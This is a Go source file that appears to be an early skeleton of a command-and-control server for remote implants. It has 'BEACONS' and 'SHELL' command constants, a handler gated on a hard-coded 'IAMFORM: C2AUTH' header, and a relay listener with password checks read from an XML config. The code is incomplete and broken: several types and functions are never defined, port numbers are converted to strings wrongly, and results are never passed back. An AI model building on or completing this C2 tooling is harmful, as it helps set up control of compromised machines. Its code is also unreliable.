package main

import (
	"encoding/xml"
	"fmt"
	"io/ioutil"
	"net/http"
)

type User struct {
	Username string `xml:"username"`
	Password string `xml:"password"`
}

const (
	BEACONS = 0x00000001
	SHELL   = 0x00000002
)

func StartC2(uri string, port int, res []byte) {
	http.HandleFunc("/"+uri, func(w http.ResponseWriter, r *http.Request) {
		iamfrom := r.Header.Get("IAMFORM")
		if iamfrom == "C2AUTH" {
			if r.Method == http.MethodPost {
				body, _ := ioutil.ReadAll(r.Body)
				w.WriteHeader(http.StatusOK)
				res = body
				return
			} else {
				w.WriteHeader(http.StatusForbidden)
				fmt.Println("bad auth")
				return
			}
		} else {
			w.WriteHeader(http.StatusForbidden)
			fmt.Println("bad auth")
			return
		}

	})
	fmt.Println("Server is running on : " + string(port))
	http.ListenAndServe(fmt.Sprintf(":%d", port), nil)

}

func StartClient(uri string, port int) {
	config, _ := parseConfig("./Client/config.xml")
	var res []byte // dong tai jie shou 40049
	go StartC2("", 50049, res)
	http.HandleFunc("/"+uri, func(w http.ResponseWriter, r *http.Request) {

		username := r.Header.Get("Username")
		password := r.Header.Get("Password")

		if authenticate(username, password, config) {
			body, _ := ioutil.ReadAll(r.Body)

			Send_Bytes_to(w, body, "http://localhost:8080", expectedHeaders)

			w.WriteHeader(http.StatusOK)
			w.Write(res)

		} else {
			w.WriteHeader(http.StatusUnauthorized)
			w.Write([]byte("Login failed\n"))

		}
	})

	fmt.Println("Server is running on : " + string(port))
	http.ListenAndServe(fmt.Sprintf(":%d", port), nil)
}

func parseConfig(filename string) (Config, error) {
	var config Config
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		return config, err
	}
	err = xml.Unmarshal(data, &config)
	return config, err
}

func authenticate(username, password string, config Config) bool {
	for _, user := range config.Users {
		if user.Username == username && user.Password == password {
			return true
		}
	}
	return false
}

func Check_Command(data []byte) uint32 {
	if len(data) < 4 {
		return 0
	}

	var num uint32
	num = uint32(data[0])<<24 | uint32(data[1])<<16 | uint32(data[2])<<8 | uint32(data[3])

	return num
}
